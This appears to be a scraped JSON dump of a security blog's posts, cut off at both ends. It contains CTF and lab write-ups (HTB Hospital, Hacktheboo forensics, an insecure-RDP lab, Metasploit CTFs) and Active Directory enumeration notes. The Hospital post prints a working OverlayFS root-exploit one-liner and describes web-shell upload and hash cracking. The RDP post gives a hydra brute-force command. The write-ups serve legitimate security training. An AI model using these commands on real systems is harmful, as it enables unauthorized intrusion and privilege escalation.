5j91hKUWbDnIy4TqiIPjhBjYhrTvi46fbGbqMpHelUGABzJ5LFfGjORMOWA1bRPz | wuaEP62Dimr42pzbLPIgGTmBwpIXlpKdcydbJnVORxY4AfpLV6ypt2EPYS2TpKbz | 4Fw5A8aWrShuerOI7mc= |_-----END CERTIFICATE----- 5985/tcp open http syn-ack Microsoft HTTPAPI httpd 2.","title":"stealth"},{"content":" Intro Hospital. It is a Medium Category Machine. It involves some File Upload Attack, Ghostscript Command Injection and some Windows Privesc\nInitial Recon PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 62 53/tcp open domain syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 443/tcp open https syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 1801/tcp open msmq syn-ack ttl 127 2103/tcp open zephyr-clt syn-ack ttl 127 2105/tcp open eklogin syn-ack ttl 127 2107/tcp open msmq-mgmt syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 3389/tcp open ms-wbt-server syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 6065/tcp open winpharaoh syn-ack ttl 127 6403/tcp open boe-cachesvr syn-ack ttl 127 6406/tcp open boe-processsvr syn-ack ttl 127 6407/tcp open boe-resssvr1 syn-ack ttl 127 6409/tcp open boe-resssvr3 syn-ack ttl 127 6617/tcp open unknown syn-ack ttl 127 6635/tcp open mpls-udp syn-ack ttl 127 8080/tcp open http-proxy syn-ack ttl 62 9389/tcp open adws syn-ack ttl 127 Read data files from: /usr/bin/../share/nmap # Nmap done at Sun Feb 25 21:01:51 2024 -- 1 IP address (1 host up) scanned in 1537.10 seconds ❯ cat Script_TCP_10.10.11.241.nmap # Nmap 7.94SVN scan initiated Sun Feb 25 21:01:52 2024 as: /usr/bin/nmap -Pn -sCV -p22,53,88,135,139,389,443,445,464,593,636,1801,2103,2105,2107,3268,3269,3389,5985,6065,6403,6406,6407,6409,6617,6635,8080,9389 --open -oN nmap/Script_TCP_10.10.11.241.nmap --system-dns --stats-every 2s 10.10.11.241 Nmap scan report for 10.10.11.241 Host is up (0.48s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA) |_ 256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519) 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-02-26 01:02:02Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb | Not valid before: 2023-09-06T10:49:03 |_Not valid after: 2028-09-06T10:49:03 443/tcp open ssl/http Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28) |_ssl-date: TLS randomness does not represent time |_http-title: Hospital Webmail :: Welcome to Hospital Webmail | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 |_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28 | tls-alpn: |_ http/1.1 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ldapssl? | ssl-cert: Subject: commonName=DC | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb | Not valid before: 2023-09-06T10:49:03 |_Not valid after: 2028-09-06T10:49:03 1801/tcp open msmq? 2103/tcp open msrpc Microsoft Windows RPC 2105/tcp open msrpc Microsoft Windows RPC 2107/tcp open msrpc Microsoft Windows RPC 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb | Not valid before: 2023-09-06T10:49:03 |_Not valid after: 2028-09-06T10:49:03 3269/tcp open globalcatLDAPssl? | ssl-cert: Subject: commonName=DC | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb | Not valid before: 2023-09-06T10:49:03 |_Not valid after: 2028-09-06T10:49:03 3389/tcp open ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject: commonName=DC.hospital.htb | Not valid before: 2024-02-24T17:09:39 |_Not valid after: 2024-08-25T17:09:39 | rdp-ntlm-info: | Target_Name: HOSPITAL | NetBIOS_Domain_Name: HOSPITAL | NetBIOS_Computer_Name: DC | DNS_Domain_Name: hospital.htb | DNS_Computer_Name: DC.hospital.htb | DNS_Tree_Name: hospital.htb | Product_Version: 10.0.17763 |_ System_Time: 2024-02-26T01:03:21+00:00 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 6065/tcp open msrpc Microsoft Windows RPC 6403/tcp open msrpc Microsoft Windows RPC 6406/tcp open msrpc Microsoft Windows RPC 6407/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 6409/tcp open msrpc Microsoft Windows RPC 6617/tcp open msrpc Microsoft Windows RPC 6635/tcp open msrpc Microsoft Windows RPC 8080/tcp open http Apache httpd 2.4.55 ((Ubuntu)) |_http-open-proxy: Proxy might be redirecting requests | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set | http-title: Login |_Requested resource was login.php |_http-server-header: Apache/2.4.55 (Ubuntu) 9389/tcp open mc-nmf .NET Message Framing Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s | smb2-time: | date: 2024-02-26T01:03:19 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Following our nmap scans, first off we check out the websites on ports 8080 and 443.\nWeb Enumeration Loading out the websites on the respective ports, on port 443 we are met with a login site same case applies to port 8080\nFuzzing The next step is fuzzing the websites for directories. Checking out port 8080 we identify a few directories open.\n.hta [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 306ms] .php [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 306ms] .htaccess [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 306ms] .hta.php [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 306ms] [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 307ms] .htpasswd [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 1429ms] .htaccess.php [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 3359ms] .htpasswd.php [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 7432ms] config.php [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 200ms] css [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 199ms] failed.php [Status: 200, Size: 3508, Words: 132, Lines: 83, Duration: 201ms] fonts [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 200ms] images [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 200ms] index.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 204ms] index.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 204ms] js [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 200ms] login.php [Status: 200, Size: 5739, Words: 1551, Lines: 134, Duration: 203ms] logout.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 202ms] register.php [Status: 200, Size: 5125, Words: 1349, Lines: 114, Duration: 208ms] server-status [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 206ms] success.php [Status: 200, Size: 3536, Words: 134, Lines: 84, Duration: 306ms] upload.php [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 203ms] uploads [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 199ms] vendor [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 200ms] First thing was to test out if we could register an account because from our fuzz output we identify that the uploads directory redirects to somewhere. After logging in we are redirected to a page where we can upload files on the webpage. Look at this instantly we need to try out some file upload attacks and since we have the resources to do so. We see that we can that we can upload a .phar file instead of a php file which subsequently involves getting a shell through accessing the uploads file.\nFrom my research i opted to go with powny a very basic, single-file, PHP shell. After changing the extension to phar extension, we get a successful upload response. From our fuzzing earlier we saw an /uploads which can basically access files that we\u0026rsquo;ve uploaded, which triggers a shell on the box.\nInitial Access. Having landed on the box, the powny shell instance was super slow for me so i decided to work from my environment and spawn back an instance on my machine using pwncat. Where we get an active session. Enumeration. Running some enumeration using pwncat in built script we identify a few interesting bits of information, first of we have the systems version number. A username called drwilliams trying to access his folder we are given permission denied as we are www-data and can\u0026rsquo;t access content inside his folder due to insufficient permissions.\nPrivesc Checking for vulnerabilities pertaining the system version we land on CVE-2023–2640 a vulnerability that affects the Ubuntu kernel’s OverlayFS module.\nFirst off we need to identify if our system is running overlay.\nand we see its running overlay to exploit this there\u0026rsquo;s a public POC\nunshare -rm sh -c \u0026#34;mkdir l u w m \u0026amp;\u0026amp; cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m \u0026amp;\u0026amp; touch m/*; python3 -c \u0026#39;import os;os.setuid(0);os.system(\\\u0026#34;/bin/bash\\\u0026#34;)\u0026#39;\u0026#34; which when executed gives us some higher privileges on the account, so basically what the bash script does is exploits the vulnerabilities CVE-2023-2640 and CVE-2023-3262 on a Ubuntu system to gain unauthorized root access. The script creates directories, copies specific Python3-related files with added capabilities, and mounts an overlay filesystem using these directories. This overlay allows the script to create a merged view of the filesystem, facilitating privilege escalation. By executing a modified Python3 script within this overlay, the user ID is set to root, and the script copies and elevates the system Bash binary, allowing execution with elevated privileges. The script concludes by cleaning up the directories and copied binaries. Notably, such activities are malicious, potentially illegal, and underscore the importance of understanding overlay filesystems, capability exploitation, and security vulnerabilities for defending against unauthorized access and maintaining system integrity.\nRunning the POC we get some root access. Now having some privesc done,we can read the shadow file to see if we can extract and crack some exposed passwords saved on the system and luckyily we have a stored hash that we can crack and get drwilliams\u0026rsquo;s hash.Cracking the hash we get the password.\nwhich when trying out at port 443 of the website, we get access to the mail portal and checking the email we get an interesting email sent to drwilliams concerning a vulnerability on ghostscript. The exploitation can occur upon opening a PS or EPS file and can allow code execution caused by Ghostscript mishandling permission validation for pipe devices poc\nAfter reading the POC readme and following it through the exploitation occurs upon opening a PS or EPS file and can allow code execution cause by GhostScript mishandling permission validation for pipe devices, to delve deep check out vsosciety_\nWindows Foothold. After sending the payload, we receive a connection back.\nNavigating to the /Desktop directory we get the user flag.\nFurther checking the bat file on the Documents directory we identify that there is an embedded password on the bat file.\nEnumerating RPCCLIENT Having the credentials and the information from our scans, RPC is open, trying out the creds we got on the bat file, we get access.\nROOT Foothold Going back to the windows shell instance and enumerating further on the root directory there\u0026rsquo;s a xampp directory which has htdocs where all the programs for the web pages will be stored.\nNotably, we can see there\u0026rsquo;s a shell.php laying around. I replace the Content with that PHP Powny Shell. You will get a Shell as Administrator and finally the Root Flag.\nChecking out pownyshell we get system access.\n","permalink":"http://localhost:1313/posts/htb/hospital/hospital-notes/","summary":"Intro Hospital. It is a Medium Category Machine. It involves some File Upload Attack, Ghostscript Command Injection and some Windows Privesc\nInitial Recon PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 62 53/tcp open domain syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 443/tcp open https syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 1801/tcp open msmq syn-ack ttl 127 2103/tcp open zephyr-clt syn-ack ttl 127 2105/tcp open eklogin syn-ack ttl 127 2107/tcp open msmq-mgmt syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 3389/tcp open ms-wbt-server syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 6065/tcp open winpharaoh syn-ack ttl 127 6403/tcp open boe-cachesvr syn-ack ttl 127 6406/tcp open boe-processsvr syn-ack ttl 127 6407/tcp open boe-resssvr1 syn-ack ttl 127 6409/tcp open boe-resssvr3 syn-ack ttl 127 6617/tcp open unknown syn-ack ttl 127 6635/tcp open mpls-udp syn-ack ttl 127 8080/tcp open http-proxy syn-ack ttl 62 9389/tcp open adws syn-ack ttl 127 Read data files from: /usr/bin/.","title":"Hospital"},{"content":" Hi 👋, in this article i\u0026rsquo;ll be sharing some challenges from the hacktheboo ctf challenges that was up i covered 3 challenges didn\u0026rsquo;t touch on the rest that much. So for the first bat challenge it was under the practice section and the last two are forensics which i decided to work on they were interesting.\nHope you have a nice read 😅\nBat Problems Explanation We are given the following file:\npayload.bat: Malicious bat file. As we can see from the following image, the bat script contains many random variables that are assigned random values. In a batch script (a .bat or .cmd file), the set command defines and manipulates environment variables which store information that can be used by the script or other programs running in the same environment (the Command Prompt session).\nSolution First, the bat file can be analyzed using Any.Run which is a malware analyzer tool. We will get the following result if we upload the sample on the aforementioned site.\nBy analyzing the behavior graph, we notice three actions made:\nThe attacker can be seen using cmd to copy PowerShell to a different path with a random name (Earttxmxaqr.png). The attacker then uses cmd again to rename the downloaded bat file and also change it\u0026rsquo;s extension to .png.bat to avoid detection. The attacker executes the base64 encoded string using the renamed PowerShell executable (-enc argument in Powershell is used to pass a base64 encoded command). By decoding the string, the flag can be retrieved.\nTrick or Treat Explanation We are given the following file:\ncapture.pcap: Packet capture file trick_or_treat.lnk: The malicious file Since the malicious file is provided by HTB, we can first gain additional information on it through VirusTotal, a famous OSINT website. After scanning, the file shows that it is indeed malicious and it connects to a malicious domain called windowsliveupdater.com. We also can notice that the file is connected to a few IP addresses, mainly 209.197.3.8 which is the malicious one.\nAnalyzing further, we can understand what kind of processes are executed by the malicious file and how it attacks a system.\nAs shown in the picture below, the malicious file seems to download malicious data from http://windowsliveupdater.com using a random User-Agent for HTTP requests to essentially mask its identity on the network. It then sets the downloaded data into a variable ($vurnwos) and processes the characters in pairs and converts them from hexadecimal representation to their actual characters. It then performs a bitwise XOR operation with 0x1d on each character and the output is appended to the $vurnwos string. Finally, it executes the variable using Invoke-Command. It also attempts to execute an empty variable ($asvods).\nAfter knowing what the malicious file does, the packet capture file can be analyzed using Wireshark to find the downloaded content. Since we know that the malicious file requested data from a website, we can filter HTTP packets only.\nGoing through the HTTP packets, we find a packet that shows the victim sending a GET request to http://windowsliveupdater.com. Analyzing the User-Agent, we can see that it is one of the randomized user agents set in the malicious file.\nNow we know that that the IP address 77.74.198.52 is responsible for the malicious file execution, we can check its HTTP response. Notice that the HTTP response packet has a cleartext data that is truncated because it is too long for Wireshark. The data is our key to getting the flag and it must be extracted using the decoding method specified in the malicious file.\nSolution Since we know that the downloable content is encoded in hex and also XOR\u0026rsquo;ed using this key 0x1d, we can use CyberChef to extract the content.\nValHalloween Explanation We are given the following file:\nLogs: Directory containing various Windows XML EventLog (.evtx) files In this challenge, we are given a series of questions that must be answered to obtain the flag. These answers can all be located in certain event log files provided by HTB.\nSolution What are the IP address and port of the server from which the malicious actors downloaded the ransomware? (for example: 98.76.54.32:443) Answer: 103.162.14.116:8888 To complete this question, we can analyze the Security log file and filter the logs with event ID 4688 which is normally logged in Event Viewer when a new process is created. After filtering the results, we find a Powershell script that was executed to download the ransomware (\u0026lsquo;mscalc.exe\u0026rsquo;) from a malicious server with its IP address and port. Additionally, we now know the estimated time of the ransomware attack is around 11:03:24 AM on 20/9/2023.\nAccording to the sysmon logs, what is the MD5 hash of the ransomware? (for example: 6ab0e507bcc2fad463959aa8be2d782f) Answer: B94F3FF666D9781CB69088658CD53772 To complete this question, we can analyze the sysmon log file and filter the logs with event ID 1 which is normally logged in Event Viewer when a new process is created. After filtering the results and since we know the Powershell script downloads the ransomware, we can attempt to find its child processes to locate the creation process of the ransomware. After analyzing the logs, we can find the ransomware with its MD5 hash.\nBased on the hash found, determine the family label of the ransomware in the wild from online reports such as Virus Total, Hybrid Analysis, etc. (for example: wannacry) Answer: lokilocker To complete this question, just put the ransomware\u0026rsquo;s MD5 hash to any OSINT tool and check its family labels.\nWhat is the name of the task scheduled by the ransomware? (for example: WindowsUpdater) Answer: Loki To complete this question, we can analyze the sysmon log file and filter the logs with keyword \u0026lsquo;schtasks\u0026rsquo; which is the name for task scheduling process. After filtering the results, we find a schtasks program with the parent process being the ransomware.\nWhat are the parent process name and ID of the ransomware process? (for example: svchost.exe_4953) Answer: powershell.exe_3856 To complete this question, we can analyze the sysmon log file and check the ransomware process again. Viewing the XML format of the ransomware process, we can easily find the parent process name and ID of the ransomware process.\nFollowing the PPID, provide the file path of the initial stage in the infection chain. (for example: D:\\Data\\KCorp\\FirstStage.pdf) Answer: C:\\Users\\HoaGay\\Documents\\Subjects\\Unexpe.docx To complete this question, we can analyze the Security log file again and check the Powershell script process again. As the question suggests, we can use the PPID to retrace the steps to the initial stage in the infection chain. As shown in the pictures below, we then stumble upon a malicious .docx file\nWhen was the first file in the infection chain opened (in UTC)? (for example: 1975-04-30_12:34:56) Answer: 2023-09-20_03:03:20 To complete this question, we can just view the XML format of the .docx file and find the TimeCreated SystemTime row. ENSURE THE TIME FORMAT IS IN UTC!\n","permalink":"http://localhost:1313/posts/hacktheboo2023-ctf/forensics/","summary":"Hi 👋, in this article i\u0026rsquo;ll be sharing some challenges from the hacktheboo ctf challenges that was up i covered 3 challenges didn\u0026rsquo;t touch on the rest that much. So for the first bat challenge it was under the practice section and the last two are forensics which i decided to work on they were interesting.\nHope you have a nice read 😅\nBat Problems Explanation We are given the following file:","title":"Hacktheboo 2023 CTF"},{"content":"Objective: Exploit the application and retrieve the flag!\nEnumeration Running nmap on our target, we see there\u0026rsquo;s a distinct port 3333 with a very peculiar service dec-notes. Our focus primarily will be exploiting the insecure rdp service.\nMetasploit To confirm if the target is running rdp we\u0026rsquo;ll use a metasploit module called rdp-scanner what it does is it attempts to connect to the specified RDP port and determines if it \u0026ldquo;speaks\u0026rdquo; RDP.\nSetting up the required variables for the module, we get an interesting response it\u0026rsquo;s running RDP!!\nBruteforcing credentials But for us to get the flag we need credentials that we can login in using rdp to get the flag, for that we\u0026rsquo;ll need to bruteforce some credentials.\nWe\u0026rsquo;ll need to use hydra for this bruteforce.\nhydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.6.23.164:3333 So basically the commands takes in a user and a password wordlist to bruteforce against the rdp service with the specified port number during enumeration.\nAs we can see immediately we get some credentials that we can try logging in with, the account administrator seems perfect cause it has more privileges as compared to the rest so we\u0026rsquo;ll login with that one to get the flag.\nN|B during an engagement it\u0026rsquo;s necessary to check or limit the bruteforce speed as not to cause a denial of service on the service you are pentesting.\nRDP login Having enumerated some credentials, we can login via rdp using the xfreerdp tool since that\u0026rsquo;s what is installed in this instance i have, but there are many tools out there that you can use to login via rdp.\nMoving forward we\u0026rsquo;ll login via xfreerdp.\nWe see we have a GUI instance of RDP connection on the target machine, now we can fetch the flag from the C:/ drive.\nMitigation Against Bruteforce The Bruteforce attack that we just performed can be mitigated. It requires the creation of an Account Policy that will prevent Hydra or any other tool from trying multiple credentials. It is essentially a Lockout Policy. To toggle this policy, we need to open the Local Security Policy window. This can be done by typing “secpol.msc”.\nChecking out the Account policy we can see there no policies implemented which falls under misconfigurations which lead to such exploitations.\nTo get to the particular policy we need to Account Policies under Security Settings. Inside the Account Policies, there exists an Account Lockout Policy. It contains 3 policies each working on an aspect of the Account Lockout.\nThe first one controls the duration of the lockout. This is the time that is required to be passed to log in again after the lockout. Then we have the Lockout Threshold. This controls the number of invalid attempts. Please toggle these as per your requirements. This should prevent the Bruteforce attack.\nAfter trying the Bruteforce attack using Hydra, it can be observed that it is not possible to extract the credentials as before. Although there is still some risk that can be prevented by forcing the users to change the passwords frequently and enforcing good password policies.\nAs we enabled a lockout policy, we will not be able to log in on the machine even with the correct password until the time passed that we toggled in the policy.\n","permalink":"http://localhost:1313/posts/exploiting-services-series/insecure-rdp/","summary":"Objective: Exploit the application and retrieve the flag!\nEnumeration Running nmap on our target, we see there\u0026rsquo;s a distinct port 3333 with a very peculiar service dec-notes. Our focus primarily will be exploiting the insecure rdp service.\nMetasploit To confirm if the target is running rdp we\u0026rsquo;ll use a metasploit module called rdp-scanner what it does is it attempts to connect to the specified RDP port and determines if it \u0026ldquo;speaks\u0026rdquo; RDP.","title":"INSECURE RDP"},{"content":"CTF Scenario. This lab is dedicated to you! No other users are on this network Once you start the lab, you will have access to a Kali terminal based instance. This machine has an interface with IP address 192.X.Y.Z. The lab has two target machines which should be located on the same subnet i.e. 192.X.Y.0/24 The target systems most of times, belong to \u0026ldquo;admin\u0026rdquo; or \u0026ldquo;root\u0026rdquo; user. Flags. This lab has only 1 Flag to be collected. The Flag can be identified either by the strings flag, flagX, FLAG, FLAGX. Recon Get the IP for the target we need to compromise, the run some nmap on them. Target 1 Checking off the scan from target-1 we can see it\u0026rsquo;s running an outdated version of Werkzeug, a utility library for Python that provides tools and libraries for building web applications hence vulnerable to remote code execution.\nHoping on metasploit we find the module that can exploit the outdated version. To be continued \u0026hellip;\u0026hellip;\n","permalink":"http://localhost:1313/posts/metasploit-ctf/metasploit-2/","summary":"CTF Scenario. This lab is dedicated to you! No other users are on this network Once you start the lab, you will have access to a Kali terminal based instance. This machine has an interface with IP address 192.X.Y.Z. The lab has two target machines which should be located on the same subnet i.e. 192.X.Y.0/24 The target systems most of times, belong to \u0026ldquo;admin\u0026rdquo; or \u0026ldquo;root\u0026rdquo; user. Flags. This lab has only 1 Flag to be collected.","title":"MSF CTF II"},{"content":"Metasploit ctf I (easy) CTF Scenario: This lab is dedicated to you! No other users are on this network :) Once you start the lab, you will have access to a Kali terminal based instance. This machine has an interface with IP address 192.X.Y.Z. The lab has two target machines which should be located on the same subnet i.e. 192.X.Y.0/24 The target systems most of times, belong to \u0026ldquo;admin\u0026rdquo; or \u0026ldquo;root\u0026rdquo; user. Do not attack the gateway located at IP address 192.X.Y.1 You can use all tools installed in Kali to complete this lab. Flags: This lab has only 1 Flag to be collected. The Flag can be identified either by the strings flag, flagX, FLAG, FLAGX. The Flag can either be a normal string or a 32-character random Hex string. Recon checking our network interfaces, with ip a s this is a command used to display info about the network interfaces on the system.\nHaving identified our target target-1, \u0026amp; target-2 , our aim is to exploit the two boxes, so running an nmap scan we see target-1 is running rmiregistry on port 1909 and target-2 is running ssh.\nWhat is rmiregistry? it\u0026rsquo;s a tool in Java used for Remote Method Invocation to manage and look up remote objects on a network,RMI in java allows objects in one Java Virtual Machine to invoke methods on objects residing in another JVM, another remote machine. This provides a way for Java applications to communicate and interact across a network.[https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/index.html](read more)\nmetasploit since it\u0026rsquo;s a metasploit ctf we need to check out for some exploit.\nWe find a module that take advantage of the deault configuration of the RMI registry and RMI Activation services, which allow loading classes from any remote (HTTP) URL.\nAs it invokes a method in the RMI Distributed Garbage Collector which is available via every RMI endpoint, it can be used against both rmiregistry and rmid, and against most other (custom) RMI endpoints as well. Note that it does not work against Java Management Extension (JMX) ports since those do not support remote class loading, unless another RMI endpoint is active in the same Java process.\nRMI method calls do not support or require any sort of authentication.\nexploit So, loading up everything on metasploit, running the module we get a shell back\nstabilizing our shell we go to the home directory under the folder alice there is some ssh keys that we can use and login with since we are already root.\nso, having known where the ssh keys are we can background our sessions and use the ssh_creds metasploit module.\nflag. the ssh_creds metasploit module, it will collect the contents of all users\u0026rsquo; .ssh directories on the targeted machine.\nAfter which we can use the ssh_login module to login into the machine target-2, we are using the login_pubkey cause of the public key we got on the alice folder.\nN|B\nI set the rhost to the machine that we are targeting target-2 which is the ip with the .4.\nChecking our sessions we see that we have a new session created and we got the flag.\n","permalink":"http://localhost:1313/posts/metasploit-ctf/metasploit-1/","summary":"Metasploit ctf I (easy) CTF Scenario: This lab is dedicated to you! No other users are on this network :) Once you start the lab, you will have access to a Kali terminal based instance. This machine has an interface with IP address 192.X.Y.Z. The lab has two target machines which should be located on the same subnet i.e. 192.X.Y.0/24 The target systems most of times, belong to \u0026ldquo;admin\u0026rdquo; or \u0026ldquo;root\u0026rdquo; user.","title":"MSF CTF"},{"content":" Credential Enumeration After acquiring a foothold, you must dig deeper using the low-privilege domain user credentials. Information to be interested in when enumerating:\nDomain users Computer Attributes group membership Group Policy Objects Permissions ACLs Trusts but not limited to the above, but the most important thing to remember is that most of these tools will not work without domain users’ credentials at any permission level.\nSo at a minimum, you need to have acquired a user’s cleartext password, NTLM password hash or SYSTEM access on a domain-joined host.\nCrackMapExec. This tool can be used to assess AD environments, where it utilizes packages from the impacket and powersploit toolkit to perform its functions.\nDomain UserEnum When enumerating you need to point CME to the Domain Controller, using creds that you retrieved you can list out domain users, it is noted that CME provides a badPwdCount attribute which is helpful when performing targeted pass spraying or building a target users list filtered out with user badPwdCount attribute that’s above 0 to be careful not to lock out accounts.\nsudo crackmapexec smb xx-domain-ip-xx -u xxxxxxxx -p xxxxx --users\nDomain Group Enum We can also obtain a complete listing of domain groups. We should save all of our output to files to easily access it again later for reporting or use with other tools.\nsudo crackmapexec smb xx-domain-ip-xx -u xxxxxxxx -p xxxxx --groups\nWe can begin to note down groups of interest. Take note of key groups like Administrators, Domain Admins, Executives, any groups that may contain privileged IT admins, etc. These groups likely contain users with elevated privileges worth targeting during our assessment.\nSmbmap A tool for enumerating SMB shares from a Linux environment can be used to list shares, permissions and share content.\nrecursive list Dirs in Shares smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only\nRpcClient Used to enumerate, add, change and even remove objects from AD.\nEnumeration Relative Identifier (RID) is a unique identifier utilized to track and identify objects, for example:\nThe SID for the INLANEFREIGHT.LOCAL domain is: S-1-5-21-3842939050-3880317879-2865463114.\nWhen an object is created within a domain, the number above (SID) will be combined with a RID to make a unique value used to represent the object.\nSo the domain user htb-student with a RID:[0x457] Hex 0x457 would = decimal 1111, will have a full user SID of S-1-5-21-3842939050-3880317879-2865463114-1111.\nThis is unique to the htb-student object in the INLANEFREIGHT.LOCAL domain and you will never see this paired value tied to another object in this domain or any other.\nSome accounts will have the same RID regardless of what host you are on, built-in admin accounts for domains will have 500 or 0x1f4 this value is unique to an object hence we can use it to enumerate further info from the domain.\nImpacket-Toolkit impacket is a versatile toolkit which gives different ways to enumerate, interact and exploit Windows protocols and find the information needed using Python.\nPsexec.py A clone of sysinternals psexec executable works by creating a remote service by uploading a randomly-named executable to the ADMIN$ shares on the target host and registers the service via RPC and the Windows services control manager.\nOnce comms are established it provides a shell as a SYSTEM on the victim host.\nwindapsearch Windapsearch is another handy Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries, we can also perform standard enumeration (dumping users, computers, and groups) and more detailed enumeration. The --da(enumerate domain admins group members ) option and the -PU( find privileged users) options. The -PU option is interesting because it will perform a recursive search for users with nested group membership.\nDomain-Admins python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da\nThis enumerates Domain Admin Groups.\nPrivileged Users Checking for potential users, using -PU with elevated privileges that may have gone unnoticed.\nN/B This is a great check for reporting since it will most likely inform the customer of users with excess privileges from nested group membership.\npython3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU\nBloodHound Once you have the domain credentials, you can run BloodHound.py a tool for auditing Active Directory where it takes large amounts of data that would be time-consuming to sift through and create a GUI representation or “attack paths” of where access with a particular user may lead.\nWindows At this point, we are interested in other misconfiguration and permission issues that could lead to lateral and vertical movement, getting the bigger picture of how the domain is setup\nDo any trusts exist with other domains both inside \u0026amp; outside the current forest? Files shares that our user has access to. ActiveDirectory Powershell Modules These are groups of Powershell cmdlets for enumerating AD environments.\nGet-ADDomain - Print out domain SID, domain functional level, and child domains.\nGet-ADUser -Filter {ServicePrincipalName -ne \u0026quot;$null\u0026quot;} -Properties ServicePrincipalName This will filter ACC with the serviceprincipalname property populated and also get us a listing ACC that may be susceptible to kerberos attacks.\nGet-ADTrust -Filter * - prints out any trust relationship the domain has, it’s useful when looking at how to take advantage of the child-to-parent trust relationship and attack across forest trusts.\nGet-ADGroup -Filter * | select name - Group enumeration\nGet-ADGroup -Identity \u0026quot;Backup Operators\u0026quot; - Detailed Group Info\nGet-ADGroupMember -Identity \u0026quot;Backup Operators\u0026quot; - Getting Group Membership\nPowerview It identifies where users are logged in on a network, enumerates domain info such as users, computers, groups, ACLs, and trusts, hunts for file shares and passwords, performs Kerberoasting and more.\nIt gives an insight into the security posture of the target domain.\ncommands Command Description Export-PowerViewCSV Append results to a CSV file ConvertTo-SID Convert a User or group name to its SID value Get-DomainSPNTicket Requests the Kerberos ticket for a specified Service Principal Name (SPN) account Domain/LDAP Functions Get-Domain Will return the 